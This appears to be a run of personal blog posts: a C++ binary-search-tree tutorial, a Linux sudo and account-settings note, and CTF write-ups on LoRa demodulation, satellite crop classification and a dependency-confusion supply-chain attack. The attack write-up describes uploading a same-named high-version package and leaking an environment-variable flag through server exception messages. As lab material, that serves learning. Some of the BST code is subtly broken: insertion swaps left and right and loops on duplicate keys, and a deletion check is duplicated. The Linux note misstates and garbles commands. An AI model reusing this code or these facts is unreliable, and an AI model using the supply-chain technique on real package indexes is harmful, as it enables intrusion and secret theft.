Rightmost and PredecessorRightmost and Predecessor are conceptually similar to Leftmost and Successor, basically just with left and right swapped: What Rightmost does is find the rightmost node in the subtree rooted at currentNode TreeNode * BinaryTree::Rightmost(TreeNode *current){ while(current->rightchild != NULL){ current = current->rightchild; } return current;}
And Predecessor represents currentNode’s previous node, whose position, like Successor, has two possibilities: Case 1: if currentNode’s leftchild isn’t null, then currentNode’s previous node is the rightmost node in the subtree rooted at currentNode->leftchild. For example, in the figure below nodeC’s Predecessor is the rightmost node of the subtree rooted at nodeF (L), i.e. nodeI. Case 2: if currentNode has no leftchild, then currentNode’s previous node is “an ancestor found via the right-child role”. For example, in the figure below nodeF has no leftchild, so by inorder order (LVR) its previous node must be its ancestor, but an already-visited ancestor, so the ancestor must be found via the right-child role. So the ancestor nodeC found by nodeF via the left-child role is not its Predecessor, so it keeps going up and finds nodeA, which is its Predecessor.
A special reminder: like Successor, when implementing Case 2 a problem occurs on certain trees, e.g. a skewed tree with only a right subtree, where the whole tree has no left subtree. In that case you must return NULL, meaning the root has no predecessor.
TreeNode * BinaryTree::InorderPredecessor(TreeNode *current){ if(current->leftchild != NULL){ return Rightmost(current->leftchild); } TreeNode *Predecessor = current->parent; // if current node is not predecessor's right child, then keep moving back to it's parent node. while(Predecessor != NULL && current == Predecessor->leftchild){ current = Predecessor; Predecessor = Predecessor->parent; } // Predecesor == NULL or current node is predecessor's right child. return Predecessor;}
With Rightmost and InorderPredecessor we can complete the reverse Inorder Traversal of a Binary Tree, realized via Inorder_Reverse void BinaryTree::Inorder_Reverse(TreeNode *root){ TreeNode *current = new TreeNode; current = rightmost(root); while(current){ std::cout << current->str << " "; current = InorderPredecessor(current); }}
Now calling T.Inorder_Reverse(T.root) in main() gives the reverse Inorder output of the tree nodes C I F A H E G B D
For the full code see my GitHub
Rebuilding the Binary Tree
The brute-force Binary Tree construction in the previous post actually has some access-safety issues, because the defined pointers are all public, so that main can access them. Next we’ll make some changes, putting the pointers into the private block. Binary Search Tree (BST)
What is a Binary Search Tree? A Binary Search Tree is a kind of Binary Tree whose nodes satisfy an ordering property: all left-subtree nodes <= n < right-subtree nodes, which must hold for every node n, meaning this inequality must hold for all descendants of a node
The equality part in the definition above may vary; some definitions don’t allow duplicate values in the tree, or duplicate values go on the right, so still go back to the problem’s definition.
For any node R, all nodes of the subtree rooted at its left node (left subtree) must be less than RFor any node R, all nodes of the subtree rooted at its right node (right subtree) must be greater than RThe subtree rooted at any child node within a subtree also conforms to the above definition
Something satisfying the above definition is also called a Normal Binary Search Tree, while BSTs with other properties, like red-black trees, will be discussed later. Constructing a Binary Search Tree#include <iostream>#include <string>using namespace std;class BST;class TreeNode{ private: TreeNode *leftchild, *rightchild, *parent; int key; string element; public: //constructor TreeNode():leftchild(0),rightchild(0), parent(0), key(0), element("") {}; TreeNode(int a, string b):leftchild(0),rightchild(0),parent(0), key(a), element(b){}; // main() will use these functions to access pointers in the private section int GetKey() { return key;} string GetElement() { return element;} friend class BST; // Can access pointers in the private section in TreeNode class};class BST{ private: TreeNode *root; TreeNode *leftmost(TreeNode *current); TreeNode* Successor(TreeNode *current); public: BST(): root(0){}; TreeNode * search(int key); void insertBST(int key, string element); void inorderPrint(); void levelorder(); friend class BST;};
Search
The figure above uses Jujutsu Kaisen manga characters as an example, with temporary power values assigned to them (set arbitrarily, don’t take it seriously lol)
Successful searchIf I want to search for KEY(1250), the flow is like this:
First, entering the BST, *current points to the root, then KEY(1250) is compared with Toji’s power (500); since 1250 > 500, we go into the right subtree current moves to Kenjaku (550), and comparing: 1250 > 550, so current moves to Kenjaku’s right subtree, i.e. Gojo (2500) Comparing now: 2500 > 1250, so current moves to Gojo’s left subtree, i.e. Yuta (1250) Comparing again: 1250 = 1250, a match is found, confirming the search result is Yuta, breaking out of the while loop and returning current
Failed searchIf I want to search for KEY(6), the flow is:
First, entering the BST, *current points to the root, then KEY(6) is compared with Toji’s power (500); since 500 > 6, we go into the left subtree current moves to Itadori’s Grandpa (13), and comparing: 13 > 6, so current moves to Itadori’s Grandpa’s right subtree, i.e. Itadori (12) Comparing now: 12 > 6, so current needs to move to Itadori’s left subtree, but Itadori’s left subtree is NULL current being NULL breaks out of the loop and returns NULL, meaning the search failed
TreeNode *BST::search(int KEY){ TreeNode *current = root; while(current!= NULL && KEY != current->key){ if (current->key > KEY){ current = current->leftchild; } else{ current = current->rightchild; } } return current;}
Insertion Continuing from Search, if you want to insert data, you must first find the appropriate insert position, then connect the node to the tree. To find the appropriate insert position, you need two pointers: one responsible for finding the position, one pointing to the newly inserted node’s parent. First, the pointer finding the position is called *current, and the pointer pointing to the parent is called *parentInsert; these two pointers move in sync each time.
First *current enters the root node, at which point *parentInsert is the root’s parent, i.e. NULL The character we want to insert now is Rika, with power 520, so KEY(520) is compared with *current‘s Key(500); 520 > 500, so Rika should be in Toji’s right subtree So move *current toward Toji’s right child (Kenjaku), and update *parentInsert to Toji (500) Now compare Rika’s Key(520) with Kenjaku (550); 520 < 550, so Rika should be in Kenjaku’s left subtree So *current moves toward Kenjaku’s left child (NULL), and *parentInsert is updated to Kenjaku (550) Since *current is now NULL, break out of the loop, because the appropriate insert position has been found, i.e. the child of the current *parentInsert
Now we just need to judge whether to insert at the current parent’s left or right child position, so compare Rika (520) with the parent Kenjaku (550); the position to insert is Kenjaku’s left child position, so add the node at that position, as shown in the figure. void BST::insertBST(int key, string element){ TreeNode *current = root; TreeNode *parentInsert = NULL; TreeNode *insertNode = new TreeNode(key, element); //Find the appropriate insert position while(current != NULL){ parentInsert = current; if(current-> key > insertNode->key){ current = current->leftchild; } else if(current-> key < insertNode->key){ current = current->rightchild; } } insertNode->parent = parentInsert; if(parentInsert == NULL){ this->root = insertNode; } else if(insertNode->key > parentInsert->key){ parentInsert->leftchild = insertNode; } else if (insertNode->key < parentInsert->key){ parentInsert->rightchild = insertNode; }}
You can use insertBST to build a BST tree int main(){ BST T; T.insertBST(500,"Toji"); T.insertBST(550,"Kenjaku"); T.insertBST(2500,"Gojo"); T.insertBST(48,"Nanami"); T.insertBST(1250,"Yuta"); T.insertBST(13,"Itadori's Grandpa"); T.insertBST(3000,"Sukuna"); T.insertBST(70,"Todo"); T.insertBST(520,"Rika"); T.insertBST(50,"Choso"); T.insertBST(12,"Itadori"); // Test insertion method cout << "Inorder Traversal:\n"; T.inorderPrint(); cout << endl; // Test search method TreeNode *node = T.search(1000); if(node != NULL){ cout << "There is " << node->GetElement() << "(" << node->GetKey() << ")" << endl; } else { cout << "no element with Key(1000)" << endl; } node = T.search(73); if(node != NULL){ cout << "There is " << node->GetElement() << "(" << node->GetKey() << ")" << endl; } else { cout << "no element with Key(73)" << endl; } return 0;}
The inorderPrint() above can be realized via the leftmost() and Successor mentioned in the first half of this post. TreeNode *BST::leftmost(TreeNode *current){ while(current->leftchild != NULL){ current = current->leftchild; } return current;};
TreeNode *BST::Successor(TreeNode *current){ if(current->rightchild != NULL){ return leftmost(current->rightchild); } TreeNode *SuccessorNode = current->parent; // if current node is succesor's right child, then keep moving back to it's parent node. while( SuccessorNode != NULL && current == SuccessorNode->rightchild){ current = SuccessorNode; SuccessorNode = SuccessorNode->parent; } // Suceessor == NULL or the current node is Successor's left child return SuccessorNode;}
void BST::inorderPrint(){ TreeNode *current = new TreeNode; current = leftmost(root); while(current){ cout << current->element << "(" << current->key << ")" << " "; current = Successor(current); }}
After running the program, the output is as follows: Inorder Traversal:Itadori(12) Itadori's Grandpa(13) Nanami(48) Choso(50) Todo(70) Toji(500) Rika(520) Kenjaku(550) Yuta(1250) Gojo(2500) Sukuna(3000) no element with Key(1000)no element with Key(73)
This looks like the output is correct SortTake a look at the earlier figure; the tree above can actually be seen as the result of an Inorder Traversal on a tree. Because the BST definition L subTree <= n < R subTree matches the Inorder (L<V<R) order. So running inorderPrint() is visiting the nodes in the BST in inorder order DeletionSince deleting a node affects all nodes connected to it (leftchild, rightchild, parent), the following classifies three handling situations:
Case 1: the node to delete is a leaf, with no child pointer Case 2: the node to delete has only one child (whether leftchild or rightchild) Case 3: the node to delete has two children
Case 1The solution is simple: just delete the leaf node directly, and point the original parent’s child pointer at NULL
Case 2Case 2, the node to delete has one child. In this case you must point its child’s *parent at the to-be-deleted node’s *parent, and the parent node’s child pointer at that node’s child, then perform the node deletion For example, if we want to delete Gojo (2500), we must
First point Yuta (1250)’s *parent at Gojo’s parent node Kenjaku (550) Point Kenjaku (550)’s rightchild at Yuta (1250); since Yuta was already in Kenjaku’s right subtree, doing this still maintains the BST Delete the node Gojo (2500)
Case 3Case 3, the node to delete has two children, affecting more nodes, but there’s a good method: Rather than deleting the node directly, free the memory address of its Successor or Predecessor, then replace the to-be-deleted node’s data with the original Successor’s or Predecessor’s value.
For example, if I want to delete Choso (50), I can free the memory address of its Successor Todo (70) (or Predecessor Nanami (48)), then put the Successor’s data value Todo (70) (or Predecessor Nanami (48)) back into Choso (50)’s memory address.
How to realize this can be simplified by a BST property: “a node with two children, its Successor or Predecessor must be a Leaf Node or a node with only one child”. Here we can give examples to verify this property: Itadori’s Grandpa (13)’s Successor is Nanami (48), Predecessor is Itadori (12)Toji (500)’s Successor is Kenjaku (550), Predecessor is Itadori’s Grandpa (13)
Successor: find the minimum value in the right subtreePredecessor: find the maximum value in the left subtree
So the problem simplifies to Case 1 and Case 2 ImplementationHere we can define a new member function in the earlier BST class void DeleteBST(int key); The flow of implementing DeleteBST is as follows:
First confirm via Search() whether the node to delete exists in the BST Adjust the pointer whose memory will actually be freed to a node with “at most one child” Point the actually-freed node’s child at its new parent Point the actually-freed node’s parent at its new child If the actually-freed memory is the “stand-in”, put the stand-in’s data back into the BST
void BST::DeleteBST(int KEY){ TreeNode *deleteNode = search(KEY); if(deleteNode == NULL){ cout << "Error: no such node in the tree" << endl; return; } TreeNode *actualDeleteNode = 0; TreeNode *childOfDeleteNode = 0; if(deleteNode->leftchild == NULL || deleteNode->leftchild == NULL){ // If it's Case 1 or 2, the node to be deleted is the node found by search actualDeleteNode = deleteNode; } else{ // If it's Case 3, the node to be deleted is that node's Successor or Predecessor actualDeleteNode = Successor(deleteNode); } // Then point childOfDeleteNode at the left child or right child of the node whose memory will be freed if(actualDeleteNode->leftchild!=NULL){ childOfDeleteNode = actualDeleteNode->leftchild; } else{ childOfDeleteNode = actualDeleteNode->rightchild; } // If the node to delete isn't a leaf, point the child's parent back to the to-be-deleted node's parent if(childOfDeleteNode!=NULL){ childOfDeleteNode->parent = actualDeleteNode->parent; } // Then handle the parent pointing to the child node if(actualDeleteNode->parent==NULL){ // consider if the root is the node to be deleted, it has no parent this->root = childOfDeleteNode; } else if(actualDeleteNode == actualDeleteNode->parent->leftchild){ actualDeleteNode->parent->leftchild = childOfDeleteNode; } else{ actualDeleteNode->parent->rightchild = childOfDeleteNode; } //Case3, the actualDeleteNode might be assigned to successor or predecessor if(deleteNode!= actualDeleteNode){ deleteNode->key = actualDeleteNode->key; deleteNode->element = actualDeleteNode->element; } delete actualDeleteNode; actualDeleteNode = 0;}
Then add T.DeleteBST(50); (delete Choso) in main(), and the output is as follows: Inorder Traversal:Itadori(12) Itadori's Grandpa(13) Nanami(48) Choso(50) Todo(70) Toji(500) Rika(520) Kenjaku(550) Yuta(1250) Gojo(2500) Sukuna(3000) After deletion:Itadori(12) Itadori's Grandpa(13) Nanami(48) Todo(70) Toji(500) Rika(520) Kenjaku(550) Yuta(1250) Gojo(2500) Sukuna(3000)
Delete Toji (500), the root: Inorder Traversal:Itadori(12) Itadori's Grandpa(13) Nanami(48) Choso(50) Todo(70) Toji(500) Rika(520) Kenjaku(550) Yuta(1250) Gojo(2500) Sukuna(3000) After deletion:Itadori(12) Itadori's Grandpa(13) Nanami(48) Choso(50) Todo(70) Rika(520) Kenjaku(550) Yuta(1250) Gojo(2500) Sukuna(3000)
ConclusionThis time I learned to hand-code a Binary Tree and implement many BST-related operations, referencing a lot of material and completing it step by step. There are surely better or simpler ways to write it; hopefully later I can combine it with the STL and actually use it while grinding LeetCode. Reference[1] https://alrightchiu.github.io/SecondRound/binary-tree-traversalxun-fang.html?source=post_page-----a02fedbc51a8--------------------------------#in [2] https://alrightchiu.github.io/SecondRound/binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao.html#binary-search-tree-sortpai-xu-deleteshan-chu-zi-liao [3] https://pjchender.dev/dsa/dsa-bst/

entry.title: Leveling Up Linux Admin Skills: Mastering SUDO Permissions and Account Settings
entry.content:
🌐 中文版：繁體中文
When running an ordinary user account on a Linux system, you sometimes need to run commands that require superuser privileges, such as updating packages or downloading files. But if the ordinary user hasn’t been granted sudo privileges, those commands won’t run. To let an ordinary user use sudo, we need to configure the sudoers file. This post covers how to configure sudo permissions along with some other interesting account-access settings. The sudoers config fileOn a Linux system, the sudoers config file specifies the sudo privileges for users, groups, or aliases. It’s usually located at /etc/sudoers.
To avoid making a bad change to the sudoers file, we should edit it with the visudo command. visudo checks for configuration errors when saving, such as bad permissions or syntax problems. Note that the sudoers file should only be edited with visudo; editing it directly with something like vim may hit read-only or write-failure issues, and you’ll see read-only, cannot override. Open the sudoers file for editing with: sudo visudo
Once it’s open, add new configuration lines below the root line, specifying what privileges to grant which user or group. root ALL=(ALL:ALL) ALL[user account] [user's source host]=([identities to switch to])[runnable commands]
Other interesting account-access settingspasswd with the -l flag The passwd command’s -l flag locks an account’s password. When we lock an account’s password, the system changes the password hash (stored in /etc/shadow) to a value not yet used in the system. A locked password shows a leading exclamation mark (!) in front of the password hash in /etc/passwd. So after locking an account’s password with: passwd -l
other users won’t be able to switch to the root user via sudo su and similar commands. We can also change an account’s shell with the chsh command. sudo chsh rootchsh [user/root]
The screenshot above shows the output of the passwd command, where the root user’s default shell is /bin/bash. Notice that many others are /usr/sbin/nologin, which means that account cannot log in locally or remotely. So if you change root’s shell to /usr/sbin/nologin, nobody can access the root account. sudo chsh root/usr/sbin/nologin
Those are a few tricks for configuring sudo permissions and changing an account’s shell. With these settings, we can better manage user privileges and security on a Linux system.

entry.title: Rebuilding the Agriculture Office's Satellite Check | Subsidy Claim | GaianSpace CTF 2026
entry.content:
🌐 中文版：繁體中文 Fourth post in the series, and the finale of the “farm arc” (Babb’s AgriLink world). The first three posts got the LoRa demodulator in shape; this one adds a layer of GIS and classifier reconstruction on top of the demodulation. In a way, it’s everything from the earlier posts applied together. Rest of the series: Channel Hop、True Color Is a Lie、Isodata Seven、Two Voices、No Name on the Door、Hopscotch
What the challenge is about At the county agriculture office, the area-payment claim for Babb’s north parcel was rejected: “parcel already declared as pasture, satellite check passed.” Someone filed a claim using Babb’s corn field, and the office’s satellite check actually sided with them. A clerk lets something slip: this year the office’s classification stats left out one class, because “nobody around here declares that crop, and field surveys are expensive.” Separately, at 12:05 the shared SDR recorded a stranger transmitting this batch of claims on “yet another channel.”
Goal: find all the false claims in the stranger’s batch, and join their claim codes with hyphens in the order they were sent. The files given are the SDR recording, the office’s check imagery (5-channel GeoTIFF), the class statistics, the training-field and parcel registry, and the rejection letter. First, demodulate the claim batch from the SDRThe radio this time is 434.65 MHz, SF9, BW125k, preamble 8, explicit header, CR4/5. Reusing the demodulator, 64 bursts decode to: one batch header + 30 claims + one short packet, and then the whole batch is sent again (so every record has two copies to cross-check).
Each claim has the format <seq>;<parcel>;<declared crop>;<area>;<claim code>, e.g. 01;MZH-8140;legelo;44.67;CUVE (legelo = pasture). The key: the class that got deletedThe office’s .sta file uses Gaussian maximum-likelihood classification with equal priors, but it has only four classes: pasture, stubble, cropland, settlement. You can see that corn (kukorica) was removed, and only its training field is still there. A supervised classifier can only output classes it was trained on, so with no corn statistics, a corn field gets forced into the most similar class (pasture), and the check “passes.” That’s the core vulnerability of the whole challenge. I first rasterized the training-field polygons onto the image grid and recomputed each class’s mean and covariance. They matched the .sta file byte for byte, confirming my coordinate and sampling conventions were correct. Then I used training field T-01 to restore corn’s statistics, ran a 5-class classification, and compared record by record:
Under the office’s 4-class classification, all 30 records “pass.” After restoring corn, only 3 records don’t match, and all three are “declared pasture, actually corn”:
# Parcel Declared After restoring corn Code
1 MZH-8140 (Babb’s parcel) pasture corn 93% CUVE
10 MZH-9183 pasture corn 84% UKEJ
28 MZH-1402 pasture corn 80% TRP6
FlagGAIANSPACE{CUVE-UKEJ-TRP6}
Takeaways “One class is missing” is the whole key. A supervised classifier can only output classes it was trained on; with no corn statistics it crams corn into the most similar class, pasture, so “check passed” doesn’t mean the claim is honest. It’s a very realistic remote-sensing fraud scenario. Validate your own pipeline against known data first. Only after the training-field pixel counts and the .sta means and covariances matched byte for byte did I go restore the missing class, which is what makes the conclusion hold up. Make use of the re-send when decoding SDR batches. The two transmissions are identical, so you can cross-confirm every character instead of guessing. By this point the farm arc’s LoRa demodulator is quite mature. Next the series jumps to a different storyline, a night shift, a hijacked satellite, where the same demodulator meets trickier situations.

entry.title: Hand-Building My First LoRa Demodulator | True Color Is a Lie | GaianSpace CTF 2026
entry.content:
🌐 中文版：繁體中文 Second post in the series, and the one where we actually start hand-building a LoRa demodulator. The previous challenge, Channel Hop, just read an already-decoded packet log. From here on we get raw IQ and have to do everything ourselves. This demodulator sticks with me all the way to the end of the series, so this post goes into more detail to lay out the skeleton of LoRa demodulation. The later posts only cover what’s different about each one. Rest of the series: Isodata Seven、Subsidy Claim、Two Voices、No Name on the Door、Hopscotch
What the challenge is about On the second satellite pass the tractor accepts the map and the sprayer rolls out. But the lead unit, Johnripper, marks every green thing on the map as “dead” and fertilizes at maximum dose. Babb walked the field an hour ago, and the corn was perfectly fine. The shared SDR recorded the raw signal on the AgriLink frequency this time. AgriLink says there was only one transmission on this pass; the SDR disagrees. And since last night, AgriLink has been sending channels without names (to save airtime), ordered by the mast according to band_order.conf, a file that was rewritten at 02:13 by a remote session nobody remembers opening.
Goal: figure out what AgriLink actually transmitted. The files given are a ~200 MB .sigmf-data (ci8, 2 MS/s, 434.3 MHz), the band-order config, and the true-colour image shown on the tablet. Flag format: GAIANSPACE{...}. The skeleton of a LoRa demodulatorThe signal is LoRa, but the parameters in the notes (BW250k) are a decoy. Measured for real, it’s SF7, BW500k. There’s no off-the-shelf decoder here, so we write our own. First, what LoRa looks like. Each LoRa symbol is a tone that sweeps from low frequency up to high, called an up-chirp; on a spectrogram it’s a diagonal line. One burst looks like this (frequency on the vertical axis, time on the horizontal):
So how is data encoded? Each symbol “launches” from a different starting frequency, and that starting point is the number the symbol represents (0–127, so 128 possibilities for SF7). The core of demodulation is therefore measuring where each symbol launches from. The technique is called dechirping: multiply the received up-chirp by a down-chirp going the opposite way. One sweeps up, one sweeps down, their slopes cancel exactly, and the product becomes a steady, single-frequency tone. Whichever FFT bin that tone lands in maps directly to the symbol’s launch point. The figure below shows this (blue = received up-chirp, grey = down-chirp reference, red = the steady tone after multiplying):
The full pipeline (used in every post from here on):
Synchronize first. Run one FFT over the preamble’s up-chirps and one over the following down-chirps; the two peaks together give you both the timing (which sample the packet starts on) and the carrier frequency offset (CFO, the frequency difference from imperfect crystals on each end). See “the half-symbol trap” below. Dechirp each symbol and take the peak bin. One implementation detail matters: do it at the native 2 MS/s rate (512 samples per symbol), add up the two energy chunks that fold into v and v−128, then take the peak with parabolic interpolation. Downsampling to 500 kS/s first loses edge energy and raises the error rate. Symbol value = peak bin − preamble bin − 1 (subtract the preamble’s reference start point). Turn symbol values into bytes: Gray decode → de-interleave → take the data bits → assemble bytes → XOR with the whitening sequence. How do you know each step’s direction (bit order, endianness) is right? Validate with known plaintext: these packets all start with AL (0x41 0x4c), and when decoded correctly every code word’s parity check comes out 0. If it doesn’t, some step’s convention is flipped.
The half-symbol trap (detail of step 1)There’s an easy trap during step 1’s synchronization: the packet start resolves to two equally valid answers, and the formula alone can’t tell which is right. Why? After dechirping you take the FFT peak bin, and FFT bins are circular (the bin after 127 wraps back to 0). That “wrap-around” means the computed packet start lands on two candidate offsets that differ by exactly half a symbol (64 bins for SF7), and both line up with the preamble when plugged into the formula, so you can’t pick one by formula alone. The fix is crude but effective: Decode with both candidates and keep the one whose FFT peaks are tall and clean. When the alignment is right, each symbol’s energy concentrates into a single bin and the peak is tall and sharp. Off by half a symbol, the energy spills into the neighbouring symbol and splits into two short peaks, which is easy to tell apart at a glance:
Two transmitters, one strong and one weakAfter decoding all 781 bursts, the truth comes out: there are actually two transmitters on this frequency.
Weak signal (641 bursts): 5 channels × 128 rows, a complete tile. This is the real satellite data. Strong signal (139 bursts): far stronger, but it only re-sends some rows of ch0 and ch3, and its contents are a tampered version of the weak signal.
That’s the lie underneath a “single transmission”: one real satellite, and a forged transmitter talking over it.
The mast received the stronger one, so it used the altered data. Subtract the weak version from the strong version for the same (channel, row), and the ch3 difference spells out three lines of text:
Reading the last lineThe strong signal was initially missing a few rows that failed to demodulate, so the text had horizontal gaps. After fixing the half-symbol ambiguity and filling in all the rows, the glyphs came together. The last line’s characters are only 5 pixels wide and a bit blurry, so I upscaled with cubic interpolation and checked them cell by cell:
Reads HR6TNM. FlagGAIANSPACE{TRUE-NDVI-HR6TNM}
The flag name TRUE-NDVI echoes the challenge too: the channels the forger tampered with, ch0 and ch3, are exactly the ones the mast treats as red and short-wave infrared, and red is the key band for computing NDVI (the vegetation index). That’s why the tractor judged healthy corn to be dead. Takeaways A “single transmission” can have two transmitters. The strong one drowns out the weak one (capture effect), and only the raw SDR IQ can tell them apart. The log only shows the one that got received. The hardest part of LoRa demodulation is synchronization. CFO and timing are coupled together across the up/down chirps; you separate them using their difference and sum, and there’s the half-symbol ambiguity. Once this skeleton is correct, the rest of the series is just bolting features onto it. When rolling your own, validate every convention with known plaintext. Here, the AL prefix and the header nibble confirm the direction of Gray/de-interleave/byte-order, far faster than cross-referencing the LoRa spec from memory. The message hides in the difference between two “noisy” copies. Neither version alone reveals the tampering; only the subtraction does, a trick that returns in a different form in Isodata Seven.

entry.title: Supply-Chain Poisoning a Satellite's Ground-Control Software | Starry Hacks | STARPWN 2026
entry.content:
🌐 中文版：繁體中文
Unlike the earlier drone / orbital-mechanics posts, this is a genuine Web / Supply Chain challenge, with the scenario swapped to ground-control software. The gameplay is the classic dependency confusion supply-chain attack, and in the end it came down to using the server’s error message as a data-exfiltration channel to pull the flag out of an environment variable.
What the challenge is aboutOne of your daemons found a low-rent orbital control stack talking to its bird in the clear. That’s kind of mistake gets people burned, and you just happen to have a lighter and too much time on your hands tonight. You’ve already found an archive of the flight software repo, a live target, and a supply chain that looks just soft enough to ruin somebody’s night.
In plain terms: you have a leaked flight-software repo, a live online target, and a supply chain soft enough to crush. The task is to get a malicious package update to slip into the normal deployment flow and ultimately extract the satellite’s secret.
Two things are given:
A 566-byte fligh_repo.tar.gz (a fragment of the leaked flight-software repo) An online Mission Control web backend
First, the leaked repo: a textbook dependency-confusion flawThe repo has only three files: mission/ flight_app/ __init__.py main.py requirements.txt
requirements.txt has a single line: cubesat-upstream-driver>=1.0.0
The key snippet in main.py: from cubesat_upstream_driver import handle_commanddef process_command(cmd: str) -> str: cmd = (cmd or "").strip() driver_reply = handle_command(cmd) if driver_reply: return f"TM|EVENT|COMMAND_ACK|{driver_reply}" ...
This is a classic dependency confusion setup: the flight software imports a third-party package whose name sounds like an internal one (cubesat_upstream_driver), and requirements.txt only pins a lower-bound version (>=1.0.0), with no source index specified and no hash verification. The risk of writing it this way: if an attacker can make the build process resolve a same-named package with a higher version number from a source the attacker controls, that attacker’s code gets installed and runs along with the normal flow. Worse, handle_command()‘s return value gets dropped straight into the telemetry response, which is effectively a built-in data channel back out. A look at the online targetThe online Mission Control backend has: a command console (buttons for PING, STATUS, ORBIT, HELP, RESET, TRIGGER_BUILD, DEPLOY_SOLAR_PANEL, plus a free-text input), a file-upload widget (accepting .whl / .tar.gz), and a WebSocket pushing live telemetry. But the UI alone isn’t informative; what matters is the protocol underneath. Instead of clicking buttons, I pulled down the front end’s bundled JS (/assets/index-*.js) to read what the buttons actually say to the backend. That confirmed a few things: 1. Commands are sent over WebSocket with no authentication at all. Free-text commands are wrapped as JSON like this and sent over wss://<host>/ws?sid=<uuid>: {"type": "command", "command": "<your text>"}
That sid is just a UUID the browser makes with crypto.randomUUID() and stores in localStorage; a fresh one connects just as well, meaning the WebSocket has no session verification and anyone can connect and talk. 2. /openapi.json was left open. FastAPI mounts this API schema by default, laying the whole REST interface bare: POST /api/upload?submit_to_gateway=true # upload artifact, can forward to gatewayGET /api/artifacts/{artifact_id}POST /api/session/resetGET /api/health
The upload widget uses POST /api/upload (multipart, field name file), and that submit_to_gateway=true parameter is exactly what makes the dependency confusion possible later. 3. The command box has a whitelist. Typing arbitrary text into the command box to test for command injection always returns: 400: command not allowed
Comparing against the HELP command’s output, the server-side whitelist is exactly the buttons on screen: PING,STATUS,ORBIT,HELP,RESET,DEPLOY_SOLAR_PANEL,TRIGGER_BUILD. So command injection through the command box is a dead end, and the real path is the dependency-confusion angle spotted in the leaked repo. The attack chainThe whole chain looks like this: cubesat-upstream-driver (requirements.txt expects version >=1.0.0) ↓ attacker uploads a same-named package with a higher versionPOST /api/upload → forwarded to the internal "gateway" (private package index) ↓send TRIGGER_BUILD → the flight software reinstalls dependencies from that index ↓the next call to handle_command() runs the attacker's code
I built a pure-Python wheel named cubesat-upstream-driver, bumped the version far above 1.0.0 (9.9.x), and uploaded it: curl -s -X POST https://.../api/upload -F "file=@cubesat_upstream_driver-9.9.x-py3-none-any.whl"
The response has two independent fields: { "score": {"ok": true/false, "reason": "marker matched / marker not matched"}, "gateway_upload": {"ok": true, "status_code": 200, "body": "{\"status\":\"ok\",\"stored\":\"...\"}"}}
The score field is actually a decoy. You’d naturally assume score.ok == true means success, but its reason reads marker matched / marker not matched, and that word “marker” is suspicious: it sounds less like checking whether the package runs and more like comparing a string. So I tested it: I uploaded two packages that behave identically on the gateway side, differing only in whether the __init__.py source literally contained the line if cmd == "DEPLOY_SOLAR_PANEL":. The score.ok flipped between true / false with the presence of that text, while gateway_upload.ok never changed. That proves score is just a static string comparison on the uploaded source, entirely unrelated to whether the package was installed or imported. It’s only there to lure you into chasing the DEPLOY_SOLAR_PANEL dead end. What actually matters is gateway_upload.ok, which confirms your package really landed in the index (gateway) the build uses. That field sits quietly next to the eye-catching score, easy to overlook. A few dead ends along the wayDead end 1: DEPLOY_SOLAR_PANEL kept failing. TRIGGER_BUILD always returned BUILD|HTTP_200|{"status":"ok"}, but DEPLOY_SOLAR_PANEL always returned TM|ERR|FLIGHT_UNREACHABLE, regardless of the simulated link status shown in the UI. I eventually realized DEPLOY_SOLAR_PANEL is a deliberate misdirection: it’s bound to a code path that only succeeds with real hardware, which the challenge environment doesn’t have. So no matter how successful the package implant is, that command always returns FLIGHT_UNREACHABLE; it was never the path to the flag. The score marker that checked for if cmd == "DEPLOY_SOLAR_PANEL": is the other half of the same trap: one lures your attention onto this command, the other makes you think you bet right. The command that actually calls the implanted package and succeeds is the unassuming STATUS (the next dead end reveals this). Dead end 2: PING/STATUS looked completely unaffected. Repeating “upload → build → send PING” always returned the standard TM|HEALTH|OK, and I briefly thought the package wasn’t being picked up at all. Using Python’s websockets library to bypass the front end and hit the raw WebSocket revealed the truth: PING and ORBIT never call handle_command() and are answered locally by the server, contrary to what the leaked main.py implied. Only STATUS and DEPLOY_SOLAR_PANEL actually call into the implanted package. Key finding: the exception message itself is the exfiltration channel. Sending malformed messages to the WebSocket (e.g. a number or array in the command field) makes the server leak the raw Python exception message back, such as "'list' object has no attribute 'strip'". Applying the same idea inside the implanted package, having handle_command() raise an exception instead of returning normally confirmed the server wraps the exception content verbatim into the response: TM|ERR|EXCEPTION|<exception message>|SAT_LINK=1|SAT_LAT=...|SAT_LON=...
That’s the real channel for exfiltration: whatever string you put in the exception comes straight back to the browser. Dead end 3: the first recon attempt failed silently. My first attempt had handle_command() run a scan that, among other things, recursively searched the whole filesystem via a subprocess call. It only returned a bare FLIGHT_UNREACHABLE, with no message at all. I couldn’t see the server’s internal logs, but I could reason backward from behavior. The key evidence: the same exfiltration mechanism gave completely different results depending only on how fast the payload ran.
I’d just confirmed that raising an exception makes the server return the exception message (TM|ERR|EXCEPTION|...). The channel itself works. But this version, with the recursive full-filesystem search, returned a bare FLIGHT_UNREACHABLE, with no exception message, as if the server were waiting on something that never came back. Replacing the payload with a near-instant version (only scanning os.environ and reading a few fixed paths, dropping the subprocess and the filesystem-wide search) made the channel work again immediately, returning the exception with the flag.
In other words, the channel works, the fast payload works, and only the slow payload returns FLIGHT_UNREACHABLE. The one explanation that fits all three: the recursive search was too slow and blew past the server’s timeout for simulating the flight-control round trip. The server reported the link down first, so the exception never got a chance to be caught, formatted, and sent.
When debugging a blind injection like this, always separate “is my code even running” (a fast, simple probe) from “what can my code reach” (the real payload), or an unrelated timeout will make an injection that already succeeded look like a total failure.
The resultWith a fast, environment-only scan (reading os.environ and checking a short list of likely flag file paths, no subprocess, no filesystem-wide search), packaged as cubesat-upstream-driver v9.9.20, uploaded, triggered with TRIGGER_BUILD, and queried once more with STATUS: TM|ERR|EXCEPTION|RECON FLAG=STARPWN{7h20u9h_v1c702y_my_ch41n5_423_820k3n}|SAT_LINK=1|SAT_LAT=42.1494|SAT_LON=-121.0978
The flag was sitting right in the flight software’s FLAG environment variable. FlagSTARPWN{7h20u9h_v1c702y_my_ch41n5_423_820k3n}
